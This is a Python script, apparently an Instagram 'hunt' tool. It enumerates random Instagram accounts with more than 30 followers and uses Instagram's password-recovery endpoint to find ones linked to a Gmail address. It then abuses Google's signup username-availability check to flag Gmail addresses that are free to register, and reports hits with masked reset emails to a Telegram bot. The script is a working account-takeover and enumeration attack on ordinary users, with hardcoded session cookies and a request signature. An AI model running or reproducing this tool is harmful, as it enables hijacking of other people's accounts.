import requests, os

URL = "https://raw.githubusercontent.com/slaughteringghost/phakkkk/main/status.txt"

try:
    res = requests.get(URL, timeout=5)
    status = res.text.strip().lower()

    if status == "expired":
        print("❌ File EXPIRED ho gayi")
        print()
        os._exit(1)
    elif status == "active":
        print("✅ File ACTIVE hai. Running tool...")
    else:
        print("⚠️ Unknown status. Exiting...", status)
        os._exit(1)

except Exception as e:
    print("⚠️ Error checking status:", e)
    os._exit(1)
print("🚀 Main tool chal raha hai...")
import sys
import time
import itertools
from colorama import init, Fore, Style
import pyfiglet
init(autoreset=True)
def ring_loader(duration=2):
    spinner = itertools.cycle(["⠋","⠙","⠸","⠴","⠦","⠇"])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(
            Fore.GREEN + Style.BRIGHT + "\r" + "SCRIPT IS RUNNING" + next(spinner)
        )
        sys.stdout.flush()
        time.sleep(0.1)
ring_loader()
ring_loader()
import os
os.system('clear')
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
import hashlib, json, os, random, re, string, sys, time, uuid; from datetime import datetime; from threading import Thread; import requests; from requests import post as pp; from random import choice, randrange; from user_agent import generate_user_agent; from cfonts import render, say; from colorama import Fore, Style, init 
init(autoreset=True)
total_hits = 0
infoinsta = {}
from colorama import Fore, Style, init
init(autoreset=True)
RED_BOLD     = Fore.RED + Style.BRIGHT
GREEN_BOLD   = Fore.GREEN + Style.BRIGHT
YELLOW_BOLD  = Fore.YELLOW + Style.BRIGHT
BLUE_BOLD    = Fore.BLUE + Style.BRIGHT
MAGENTA_BOLD = Fore.MAGENTA + Style.BRIGHT
CYAN_BOLD    = Fore.CYAN + Style.BRIGHT
banner = f"""
{CYAN_BOLD}============================================================{Style.RESET_ALL}
{YELLOW_BOLD}               𝐅𝐀𝐒𝐓 𝗥𝗔𝗡𝗗𝗢𝗠 ʏᴇᴀʀ 𝗛𝗨𝗡𝗧 𝐅𝐈𝐋𝐄{Style.RESET_ALL}
{CYAN_BOLD}============================================================{Style.RESET_ALL}
{GREEN_BOLD} AUTHOR   : {MAGENTA_BOLD}𝗛𝗔𝗭𝗬        {Style.RESET_ALL}
{GREEN_BOLD} 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠: {MAGENTA_BOLD} @𝘆𝗮𝗽𝗹𝗼𝗹{Style.RESET_ALL}
{GREEN_BOLD} 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠: {MAGENTA_BOLD}@𝗦𝗮𝘀𝘀𝘇𝗼𝗿        
{GREEN_BOLD} CHANNEL  : {MAGENTA_BOLD}@ᴘʏᴛɪᴍᴇʙʀᴜʜ  {Style.RESET_ALL}
{GREEN_BOLD} FILETYPE : {MAGENTA_BOLD}𝐅𝐀𝐒𝐓 𝗥𝗔𝗡𝗗𝗢𝗠 ʏᴇᴀʀ 𝗛𝗨𝗡𝗧 𝐅𝐈𝐋𝐄       {Style.RESET_ALL}
{CYAN_BOLD}============================================================{Style.RESET_ALL}
"""
print(banner)
ID = input(' •\033[1m\033[33m 𝐘𝐨𝐮𝐫 𝐂𝐡𝐚𝐭 𝐈𝐝 ➛\033[1m\033[32m')
print('\033[0m')
TOKEN = input(' •\033[1m\033[33m 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧 ➛\033[1m\033[32m')
print('\033[0m')
os.system('clear')
import sys
from colorama import Fore, init
init()
GREEN_BOLD   = Fore.GREEN + Style.BRIGHT
RED_BOLD     = Fore.RED + Style.BRIGHT
YELLOW_BOLD  = Fore.YELLOW + Style.BRIGHT
CYAN_BOLD    = Fore.CYAN + Style.BRIGHT
RESET        = Style.RESET_ALL
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0

def update_stats():
    sysdontwrite = f"""{RESET} {RED_BOLD}
 ██╗░░██╗░█████╗░███████╗██╗░░░██╗         
 ██║░░██║██╔══██╗╚════██║╚██╗░██╔╝          
 ███████║███████║░░███╔═╝░╚████╔╝░          
 ██╔══██║██╔══██║██╔══╝░░░░╚██╔╝░░           
 ██║░░██║██║░░██║███████╗░░░██║░░░           
 ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░            
   
   
  ├────────────────────────────────┤                    
 {GREEN_BOLD}  𝗛𝗔𝗭𝗬 𝗛𝗜𝗧𝗦 : {RESET}{hits}
 {RED_BOLD}  𝗛𝗔𝗭𝗬 𝗖𝗛𝗘𝗖𝗞𝗦 : {RESET}{bad_insta}
 {YELLOW_BOLD}  𝗛𝗔𝗭𝗬 𝗕𝗔𝗗 𝗠𝗔𝗜𝗟 : {RESET}{bad_email}
 {CYAN_BOLD}  𝗛𝗔𝗭𝗬 𝗚𝗢𝗢𝗗 𝗜𝗚 : {RESET}{good_ig}          
├────────────────────────────────┤                    
"""
    sys.stdout.write(sysdontwrite)
    sys.stdout.flush()
def Aayu():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                          'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('token.txt', 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Aayu()
Aayu()
def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open('token.txt', 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + '@gmail.com'
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass
def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()
def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        hazypyporno = response.get('email', 'Reset None')
    except:
        hazypyporno = 'Reset None'
    return hazypyporno
def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass
def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    total_hits += 1
    info_text = f"""
    HITS: {total_hits} 
━━━━━━━━━━━━━━━━━━━━━━
USER: {username} 
EMAIL: {username}@{domain} 
RESET: {rest(username)}
━━━━━━━━━━━━━━━━━━━━━━
BY: @HazyPy | JOIN: @pytimebruh

"""
    with open('Random [2010-23] hits by @hazypy.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass
def hazypy():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(10000, 21254029834)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers <= 30:
                    continue
                infoinsta[username] = account
                emails = [username + '@gmail.com']
                for email in emails:
                    check(email)
        except Exception:
            pass
for _ in range(150):
    Thread(target=hazypy).start()